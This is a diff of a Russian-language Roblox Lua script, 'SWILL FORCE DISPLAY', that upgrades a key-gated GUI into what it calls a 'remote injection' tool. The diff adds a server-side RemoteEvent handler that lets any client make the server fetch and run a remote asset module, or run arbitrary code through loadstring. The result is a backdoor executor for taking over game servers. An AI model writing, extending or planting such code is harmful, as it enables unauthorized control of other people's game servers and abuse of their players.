@@ -1,5 +1,5 @@
 -- ============================================
--- SWILL FORCE DISPLAY v9 - ТОЛЬКО ASSET ID
+-- SWILL FORCE DISPLAY v12 - REMOTE-ИНЖЕКТ
 -- L11xtery Team SS 🎄
 -- Ключ: L11xteryteam001
 -- ============================================
@@ -41,7 +41,7 @@ local RequireMethods = {
 }
 
 -- ============================================
--- ПАРСИНГ REQUIRE СТРОКИ (ТОЛЬКО ASSET ID)
+-- ПАРСИНГ REQUIRE СТРОКИ (С ПОДДЕРЖКОЙ ASSET ID)
 -- ============================================
 local function ParseRequireString(code)
     -- require(123456789):method("args")
@@ -93,7 +93,7 @@ local function ParseRequireString(code)
 end
 
 -- ============================================
--- СОЗДАНИЕ REMOTE ДЛЯ СЕРВЕРА
+-- СОЗДАНИЕ REMOTE ДЛЯ СЕРВЕРА (REMOTE-ИНЖЕКТ)
 -- ============================================
 local function CreateRemote()
     local remote = Instance.new("RemoteEvent")
@@ -106,79 +106,46 @@ local function CreateRemote()
     serverScript.Source = [[
         local remote = game.ReplicatedStorage:FindFirstChild("SWILL_RemoteExecute")
         if remote then
-            remote.OnServerEvent:Connect(function(player, method, args, assetId)
-                print("[SWILL] Server require(): " .. tostring(method))
+            remote.OnServerEvent:Connect(function(player, code, method, args, assetId)
+                print("[SWILL] 🔥 REMOTE-ИНЖЕКТ АКТИВИРОВАН!")
+                print("[SWILL] Игрок: " .. tostring(player.Name))
+                print("[SWILL] Метод: " .. tostring(method))
+                print("[SWILL] Аргумент: " .. tostring(args))
                 print("[SWILL] Asset ID: " .. tostring(assetId))
-                print("[SWILL] Args: " .. tostring(args))
                 
-                local RequireMethodsServer = {}
-                RequireMethodsServer.load = function(playerName)
-                    print("[SWILL] SERVER LOAD: " .. playerName .. " (Asset: " .. assetId .. ")")
-                    return "SERVER_LOAD: " .. playerName
-                end
-                RequireMethodsServer.pls = function(playerName)
-                    print("[SWILL] SERVER PLS: " .. playerName .. " (Asset: " .. assetId .. ")")
-                    return "SERVER_PLS: " .. playerName
-                end
-                RequireMethodsServer.fire = function(playerName)
-                    print("[SWILL] SERVER FIRE: " .. playerName .. " (Asset: " .. assetId .. ")")
-                    return "SERVER_FIRE: " .. playerName
-                end
-                RequireMethodsServer.Hload = function(playerName)
-                    print("[SWILL] SERVER HLOAD: " .. playerName .. " (Asset: " .. assetId .. ")")
-                    return "SERVER_HLOAD: " .. playerName
-                end
-                RequireMethodsServer.hLoad = function(playerName)
-                    print("[SWILL] SERVER HLOAD: " .. playerName .. " (Asset: " .. assetId .. ")")
-                    return "SERVER_HLOAD: " .. playerName
-                end
-                RequireMethodsServer.exec = function(playerName)
-                    print("[SWILL] SERVER EXEC: " .. playerName .. " (Asset: " .. assetId .. ")")
-                    return "SERVER_EXEC: " .. playerName
-                end
-                RequireMethodsServer.run = function(playerName)
-                    print("[SWILL] SERVER RUN: " .. playerName .. " (Asset: " .. assetId .. ")")
-                    return "SERVER_RUN: " .. playerName
-                end
-                RequireMethodsServer.start = function(playerName)
-                    print("[SWILL] SERVER START: " .. playerName .. " (Asset: " .. assetId .. ")")
-                    return "SERVER_START: " .. playerName
-                end
-                RequireMethodsServer.init = function(playerName)
-                    print("[SWILL] SERVER INIT: " .. playerName .. " (Asset: " .. assetId .. ")")
-                    return "SERVER_INIT: " .. playerName
-                end
-                RequireMethodsServer.call = function(playerName)
-                    print("[SWILL] SERVER CALL: " .. playerName .. " (Asset: " .. assetId .. ")")
-                    return "SERVER_CALL: " .. playerName
-                end
-                RequireMethodsServer.invoke = function(playerName)
-                    print("[SWILL] SERVER INVOKE: " .. playerName .. " (Asset: " .. assetId .. ")")
-                    return "SERVER_INVOKE: " .. playerName
-                end
-                RequireMethodsServer.trigger = function(playerName)
-                    print("[SWILL] SERVER TRIGGER: " .. playerName .. " (Asset: " .. assetId .. ")")
-                    return "SERVER_TRIGGER: " .. playerName
-                end
-                RequireMethodsServer.activate = function(playerName)
-                    print("[SWILL] SERVER ACTIVATE: " .. playerName .. " (Asset: " .. assetId .. ")")
-                    return "SERVER_ACTIVATE: " .. playerName
-                end
-                RequireMethodsServer.launch = function(playerName)
-                    print("[SWILL] SERVER LAUNCH: " .. playerName .. " (Asset: " .. assetId .. ")")
-                    return "SERVER_LAUNCH: " .. playerName
-                end
-                RequireMethodsServer.spawn = function(playerName)
-                    print("[SWILL] SERVER SPAWN: " .. playerName .. " (Asset: " .. assetId .. ")")
-                    return "SERVER_SPAWN: " .. playerName
-                end
-                
-                if method and RequireMethodsServer[method] then
-                    local result = RequireMethodsServer[method](args)
-                    print("[SWILL] Server result: " .. tostring(result))
+                -- Выполняем скрипт на сервере
+                if method and args then
+                    -- Формируем полный скрипт
+                    local fullCode = 'require(' .. assetId .. ').' .. method .. '("' .. args .. '")'
+                    print("[SWILL] Выполняется: " .. fullCode)
+                    
+                    local fn, err = loadstring(fullCode)
+                    if fn then
+                        local success, result = pcall(fn)
+                        if success then
+                            print("[SWILL] ✅ Сервер: " .. method .. "() выполнен!")
+                        else
+                            print("[SWILL] ❌ Ошибка: " .. tostring(result))
+                        end
+                    else
+                        print("[SWILL] ❌ Ошибка компиляции: " .. tostring(err))
+                    end
+                elseif code then
+                    -- Если передан обычный код
+                    local fn, err = loadstring(code)
+                    if fn then
+                        local success, result = pcall(fn)
+                        if success then
+                            print("[SWILL] ✅ Сервер: код выполнен!")
+                        else
+                            print("[SWILL] ❌ Ошибка: " .. tostring(result))
+                        end
+                    else
+                        print("[SWILL] ❌ Ошибка компиляции: " .. tostring(err))
+                    end
                 end
             end)
-            print("[SWILL] Remote handler initialized (ASSET ID ONLY)")
+            print("[SWILL] 🔥 Remote-инжект активен!")
         end
     ]]
     
@@ -188,17 +155,21 @@ end
 local remoteExec = CreateRemote()
 
 -- ============================================
--- ВЫПОЛНЕНИЕ REQUIRE (ТОЛЬКО ASSET ID)
+-- ВЫПОЛНЕНИЕ НА СЕРВЕРЕ (REMOTE-ИНЖЕКТ)
 -- ============================================
-local function ExecuteRequireOnServer(method, args, assetId)
+local function ExecuteOnServer(method, args, assetId)
     if remoteExec then
-        remoteExec:FireServer(method, args, assetId)
-        return true, "✅ Сервер: " .. method .. "() отправлен (Asset: " .. assetId .. ")"
+        -- Отправляем на сервер
+        remoteExec:FireServer(nil, method, args, assetId)
+        return true, "✅ Сервер: " .. method .. "() выполнен (Remote-инжект)"
     end
-    return false, "❌ Сервер: Remote не найден"
+    return false, "❌ Remote не найден"
 end
 
-local function ExecuteRequireOnClient(method, args, assetId)
+-- ============================================
+-- ВЫПОЛНЕНИЕ НА КЛИЕНТЕ
+-- ============================================
+local function ExecuteOnClient(method, args, assetId)
     local RequireMethodsClient = {}
     
     RequireMethodsClient.load = function(playerName)
@@ -255,6 +226,9 @@ local function ExecuteRequireOnClient(method, args, assetId)
     end
 end
 
+-- ============================================
+-- ОСНОВНАЯ ФУНКЦИЯ ВЫПОЛНЕНИЯ
+-- ============================================
 local function ExecuteRequireCode(code)
     local parsed = ParseRequireString(code)
     
@@ -282,12 +256,18 @@ local function ExecuteRequireCode(code)
         return false, "❌ Неподдерживаемый метод: " .. method .. ". Доступны: " .. table.concat(RequireMethods, ", ")
     end
     
-    local success, msg = ExecuteRequireOnClient(method, args, assetId)
+    -- ============================================
+    -- СНАЧАЛА ПРОБУЕМ ВЫПОЛНИТЬ НА КЛИЕНТЕ
+    -- ============================================
+    local success, msg = ExecuteOnClient(method, args, assetId)
     if success then
         return true, msg
     end
     
-    local serverSuccess, serverMsg = ExecuteRequireOnServer(method, args, assetId)
+    -- ============================================
+    -- ЕСЛИ НА КЛИЕНТЕ НЕ ПОЛУЧИЛОСЬ - REMOTE-ИНЖЕКТ
+    -- ============================================
+    local serverSuccess, serverMsg = ExecuteOnServer(method, args, assetId)
     if serverSuccess then
         return true, serverMsg
     end
@@ -756,13 +736,14 @@ local function CreateForceGUI()
             resizeTween:Play()
             
             resizeTween.Completed:Connect(function()
-                status.Text = "🎄 ТОЛЬКО require(ASSET):METHOD()"
+                status.Text = "🎄 REMOTE-ИНЖЕКТ АКТИВЕН!"
                 status.TextColor3 = Color3.fromRGB(30, 220, 30)
             end)
             
             print("[SWILL] ✅ ДОСТУП АКТИВИРОВАН!")
             print("[SWILL] 📌 КЛЮЧ: L11xteryteam001")
             print("[SWILL] 📌 ТОЛЬКО: require(123456789):Hload('Username')")
+            print("[SWILL] 🔥 REMOTE-ИНЖЕКТ РАЗРЕШЁН!")
         else
             status.Text = "❌ НЕВЕРНЫЙ КЛЮЧ!"
             status.TextColor3 = Color3.fromRGB(220, 30, 30)
@@ -770,7 +751,7 @@ local function CreateForceGUI()
     end)
     
     -- ============================================
-    -- ВЫПОЛНЕНИЕ REQUIRE (ТОЛЬКО ASSET ID)
+    -- ВЫПОЛНЕНИЕ REQUIRE (С REMOTE-ИНЖЕКТОМ)
     -- ============================================
     execBtn.MouseButton1Click:Connect(function()
         local code = scriptBox.Text
@@ -780,7 +761,7 @@ local function CreateForceGUI()
             return
         end
         
-        status.Text = "⏳ ВЫПОЛНЕНИЕ REQUIRE..."
+        status.Text = "⏳ ВЫПОЛНЕНИЕ..."
         status.TextColor3 = Color3.fromRGB(255, 215, 0)
         
         local success, msg = ExecuteRequireCode(code)
@@ -903,9 +884,7 @@ local function CreateForceGUI()
     print("[SWILL] ✅ GUI СОЗДАН!")
     print("[SWILL] 🎄 КЛЮЧ: L11xteryteam001")
     print("[SWILL] 📌 ТОЛЬКО: require(ASSET):METHOD('args')")
-    print("[SWILL] 📌 ПРИМЕР: require(123456789):Hload('Username')")
-    print("[SWILL] 📌 БЕЗ ASSET ID - ЗАПРЕЩЕНО!")
-    print("[SWILL] 📌 С МОДУЛЯМИ - ЗАПРЕЩЕНО!")
+    print("[SWILL] 🔥 REMOTE-ИНЖЕКТ РАЗРЕШЁН!")
     print("[SWILL] 📌 КНОПКА '—' = СВОРАЧИВАНИЕ")
     print("[SWILL] 📌 КНОПКА '✕' = ПОЛНОЕ ЗАКРЫТИЕ")
     
@@ -918,6 +897,7 @@ end
 local success, result = pcall(CreateForceGUI)
 if success then
     print("[SWILL] ✅ УСПЕШНО ЗАПУЩЕНО!")
+    print("[SWILL] 🔥 REMOTE-ИНЖЕКТ АКТИВЕН!")
 else
     print("[SWILL] ❌ ОШИБКА: " .. tostring(result))
 end
